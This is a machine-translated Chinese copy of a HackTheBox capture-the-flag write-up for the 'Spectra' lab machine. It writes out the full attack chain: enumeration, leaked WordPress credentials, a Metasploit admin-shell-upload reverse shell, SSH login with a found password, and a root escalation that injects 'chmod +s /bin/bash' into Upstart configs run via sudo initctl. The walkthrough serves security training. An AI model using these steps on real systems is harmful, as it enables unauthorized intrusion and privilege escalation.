<html>
<head>
<title>HackTheBox Writeup: Spectra</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子报道:光谱</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-writeup-spectra-83ecdeeae568?source=collection_archive---------2-----------------------#2021-06-26">https://infosecwriteups.com/hackthebox-writeup-spectra-83ecdeeae568?source=collection_archive---------2-----------------------#2021-06-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/a370fa73feead037ddd9ebb05a2ce7f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Anf0Uo5_IhUmR9stwD_WCQ.png"/></div></div></figure><p id="6177" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这是一个由易到难的盒子，要求攻击者枚举一个网站，并找到一个带有隐藏凭据的文件来获得立足点。为了提升用户权限，攻击者需要查找包含凭据的文件。最后，为了获得root权限，攻击者必须利用二进制文件<em class="kw"> /sbin/initctl。</em></p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="4067" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">列举</h1><p id="0cd8" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">我开始通过用<strong class="ka ir"> NMAP </strong>执行快速扫描来枚举目标机器，以识别任何打开的端口:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="d378" class="mq lf iq mm b gy mr ms l mt mu">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.229</span><span id="c954" class="mq lf iq mm b gy mv ms l mt mu">PORT     STATE SERVICE REASON<br/>22/tcp   open  ssh     syn-ack ttl 63<br/>80/tcp   open  http    syn-ack ttl 63<br/>3306/tcp open  mysql   syn-ack ttl 63</span></pre><p id="2d1d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">扫描发现三个端口打开(即端口22、80和3306)。接下来，我使用NMAP来识别每个端口上运行的服务，并使用通用NSE脚本来查找我可以利用的任何常见漏洞:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="c5be" class="mq lf iq mm b gy mr ms l mt mu">nmap -sV -sC -Pn -v -p 22,80,3306 -oN nmap-report 10.10.10.229</span><span id="6a26" class="mq lf iq mm b gy mv ms l mt mu">PORT     STATE SERVICE VERSION<br/>22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)<br/>| ssh-hostkey: <br/>|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)<br/>80/tcp   open  http    nginx 1.17.4<br/>| http-methods: <br/>|_  Supported Methods: GET HEAD<br/>|_http-server-header: nginx/1.17.4<br/>|_http-title: Site doesn't have a title (text/html).<br/>3306/tcp open  mysql   MySQL (unauthorized)</span></pre><p id="0ff9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我可以看到有一个网站被托管在80端口，并决定开始寻找一个初步的立足点。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="71d5" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">HTTP —端口80分析</h1><p id="4c53" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">导航到<a class="ae mw" href="http://10.10.10.229/" rel="noopener ugc nofollow" target="_blank"><em class="kw">http://10 . 10 . 10 . 229/</em></a>，找到如下网页:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mx"><img src="../Images/ea1982d73038269e74cb34a6947dcc0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OMMtV7WnMtyvDccQMaegcw.png"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">索引页</figcaption></figure><p id="c1d3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当我尝试页面上的链接时，我收到一个错误:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/984402602ae884f8d4e2c711f68d6bd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:894/format:webp/1*ZzKkqVCx6F6Me0jGRfM-DA.png"/></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">错误页面</figcaption></figure><p id="2705" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我需要将<strong class="ka ir"> spectra.htb </strong>添加到我的<em class="kw"> /etc/hosts </em>文件中。添加后，我可以导航到网页上的链接。访问第一个链接时，我可以看到有一个WordPress站点正在运行:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nd"><img src="../Images/36fa5d902716f40d39bda4140765d02a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tB9E-CP6V8d9wti2x0ivZQ.png"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">WordPress网站</figcaption></figure><p id="c80f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我决定使用<strong class="ka ir"> wpscan </strong>为用户枚举网站，并找到一个名为<strong class="ka ir"> administrator </strong>的用户:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="f1d1" class="mq lf iq mm b gy mr ms l mt mu">wpscan --url <a class="ae mw" href="http://10.10.10.229/main" rel="noopener ugc nofollow" target="_blank">http://10.10.10.229/main</a> -e u</span><span id="a6be" class="mq lf iq mm b gy mv ms l mt mu">[+] administrator<br/> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br/> | Confirmed By: Login Error Messages (Aggressive Detection)</span></pre><p id="7a31" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我还试图列举网站上任何易受攻击的插件，但这并没有透露任何有用的信息。</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="492b" class="mq lf iq mm b gy mr ms l mt mu">wpscan --url <a class="ae mw" href="http://10.10.10.229/main" rel="noopener ugc nofollow" target="_blank">http://10.10.10.229/main</a> -e ap</span><span id="38a4" class="mq lf iq mm b gy mv ms l mt mu">[+] Enumerating All Plugins (via Passive Methods)</span><span id="a932" class="mq lf iq mm b gy mv ms l mt mu">[i] No plugins Found.</span></pre><p id="7c80" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我决定继续前进，检查之前在索引页面上看到的<em class="kw"> /testing </em>链接。在测试目录中，我发现了一个名为<strong class="ka ir"> wp-config.php.save的文件。</strong>这个文件看起来是空的，但是如果您查看页面源代码，您会看到它包含一个数据库的凭证:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="dfef" class="mq lf iq mm b gy mr ms l mt mu">define( ‘DB_NAME’, ‘dev’ );</span><span id="7d62" class="mq lf iq mm b gy mv ms l mt mu">/** MySQL database username */<br/>define( ‘DB_USER’, ‘devtest’ );</span><span id="1fd8" class="mq lf iq mm b gy mv ms l mt mu">/** MySQL database password */<br/>define( ‘DB_PASSWORD’, ‘devteam01’ );</span></pre><p id="39c1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我试着用上面找到的凭证登录到<strong class="ka ir"> MySQL </strong>数据库和<strong class="ka ir">web-login.php</strong>但是失败了。根据之前的WordPress扫描，我还知道发现了一个名为<strong class="ka ir"> administrator </strong>的用户名。我尝试使用以下凭据登录web-login.php页面，并获得成功:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="75a0" class="mq lf iq mm b gy mr ms l mt mu"> administrator:devteam01</span></pre><p id="680e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我使用了<strong class="ka ir"> msfconsole </strong>来获得一个反向shell(在meterpreter shell出现之前，可能需要重复几次):</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="570f" class="mq lf iq mm b gy mr ms l mt mu">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhosts 10.10.10.229<br/>rhosts =&gt; 10.10.10.229<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set password devteam01<br/>password =&gt; devteam01<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set username administrator<br/>username =&gt; devtest<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set targeturi /main<br/>targeturi =&gt; /main<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit</span><span id="67b3" class="mq lf iq mm b gy mv ms l mt mu">meterpreter &gt;</span></pre><p id="182d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了得到一个合适的shell，我使用了<strong class="ka ir"> shell </strong>命令，然后切换到<em class="kw"> /tmp </em>目录。然后，我使用python获得了一个稳定的shell:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="f010" class="mq lf iq mm b gy mr ms l mt mu">cd /tmp<br/>python3 -c “import pty;pty.spawn(‘/bin/bash’)”</span><span id="dc4a" class="mq lf iq mm b gy mv ms l mt mu">bash-4.3$</span></pre><p id="2a3e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我花了一些时间寻找提升权限的方法，最终，我在<em class="kw"> /opt </em>目录中找到了一个有趣的文件，名为<strong class="ka ir"> autologin.conf.orig </strong>:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="55f9" class="mq lf iq mm b gy mr ms l mt mu"># Copyright 2016 The Chromium OS Authors. All rights reserved.<br/># Use of this source code is governed by a BSD-style license that can be<br/># found in the LICENSE file.<br/>description   "Automatic login at boot"<br/>author        "<a class="ae mw" href="mailto:chromium-os-dev@chromium.org" rel="noopener ugc nofollow" target="_blank">chromium-os-dev@chromium.org</a>"<br/># After boot-complete starts, the login prompt is visible and is accepting<br/># input.<br/>start on started boot-complete<br/>script<br/>  passwd=<br/>  # Read password from file. The file may optionally end with a newline.<br/>  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do<br/>    if [ -e "${dir}/passwd" ]; then<br/>      passwd="$(cat "${dir}/passwd")"<br/>      break<br/>    fi<br/>  done<br/>  if [ -z "${passwd}" ]; then<br/>    exit 0<br/>  fi<br/>  # Inject keys into the login prompt.<br/>  #<br/>  # For this to work, you must have already created an account on the device.<br/>  # Otherwise, no login prompt appears at boot and the injected keys do the<br/>  # wrong thing.<br/>  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter</span></pre><p id="9ba5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">浏览内容，脚本显示在<em class="kw">/mnt/stateful _ partition/etc/autolog in</em>中有一个密码文件。导航到这个位置，我发现了一个名为<strong class="ka ir"> passwd </strong>的文件，其中包含一个密码:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="187f" class="mq lf iq mm b gy mr ms l mt mu">bash-4.3$ cat passwd</span><span id="3c46" class="mq lf iq mm b gy mv ms l mt mu">SummerHereWeCome!!</span></pre><p id="0dd7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我尝试以一个目录在<em class="kw"> /home </em>的用户的身份SSH到目标机器，并且能够以用户<strong class="ka ir"> katie的身份登录。</strong>然后我就可以获得用户标志了:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="ba0e" class="mq lf iq mm b gy mr ms l mt mu">$ ssh katie@10.10.10.229</span><span id="fa2c" class="mq lf iq mm b gy mv ms l mt mu">-bash-4.3$ whoami<br/>katie</span><span id="5420" class="mq lf iq mm b gy mv ms l mt mu">-bash-4.3$ cat user.txt<br/>e89d27fe195e........</span></pre></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="3cb8" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">权限提升</h1><p id="bdec" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">我检查了用户<strong class="ka ir"> katie </strong>可以使用root权限运行哪些命令，发现用户可以在没有密码的情况下以root身份运行二进制文件<em class="kw"> /sbin/initctl </em>:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="2ed5" class="mq lf iq mm b gy mr ms l mt mu">$ sudo -l</span><span id="7493" class="mq lf iq mm b gy mv ms l mt mu">User katie may run the following commands on spectra:<br/>    (ALL) SETENV: NOPASSWD: /sbin/initctl</span></pre><p id="ca83" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">以下链接很好地解释了如何利用这一点来提升权限:</p><div class="ne nf gp gr ng nh"><a href="https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9" rel="noopener follow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">initctl的SUDO权限|权限提升技术| Ishara Abeythissa</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">initctl允许系统管理员与Upstart链接和通信。能够管理用户作业。作为例子，如果…</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">isharaabeythissa.medium.com</p></div></div><div class="nq l"><div class="nr l ns nt nu nq nv jw nh"/></div></div></a></div><p id="bffd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我首先检查了位于<strong class="ka ir"> /etc/init </strong>目录中的哪些配置文件可以注入恶意代码:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="8d23" class="mq lf iq mm b gy mr ms l mt mu">-rw-rw----  1 root developers   478 Jun 29  2020 test.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test1.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test10.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test2.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test3.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test4.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test5.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test6.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test7.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test8.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test9.conf</span></pre><p id="62c9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">浏览这些文件，我可以看到用户katie可以写入上面列出的文件，因为该用户属于developers组:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="baa6" class="mq lf iq mm b gy mr ms l mt mu">$ id</span><span id="88fe" class="mq lf iq mm b gy mv ms l mt mu">uid=20156(katie)gid=20157(katie)groups=20157(katie),20158(developer)</span></pre><p id="8bc0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我注入了一些代码，为所有用户设置了SUID权限<strong class="ka ir"> /bin/bash </strong>，并允许我以root用户身份接管bash shell:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="5d40" class="mq lf iq mm b gy mr ms l mt mu">echo "script<br/>&gt; <br/>&gt;     chmod +s /bin/bash<br/>&gt; <br/>&gt; end script" &gt;&gt; test.conf</span></pre><p id="8117" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后，我用root权限启动了<strong class="ka ir">测试</strong>服务，并启动了bash:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="2bc7" class="mq lf iq mm b gy mr ms l mt mu">$ sudo /sbin/initctl start test<br/>test start/running, process 4877</span><span id="69a7" class="mq lf iq mm b gy mv ms l mt mu"># -p option lets bash keep the effective userid it is launched with, wheras without it, it will set the effective uid to the actual uid (your user).</span><span id="d9c9" class="mq lf iq mm b gy mv ms l mt mu">$ /bin/bash -p<br/>bash-4.3#</span><span id="17f9" class="mq lf iq mm b gy mv ms l mt mu">bash-4.3# cat /root/root.txt<br/>d44519713b88.........</span></pre><p id="0de1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在得到一个根shell之后，我能够得到根标志，如上图所示。谢谢你一直读到最后，祝你黑客快乐😄！</p></div></div>    
</body>
</html>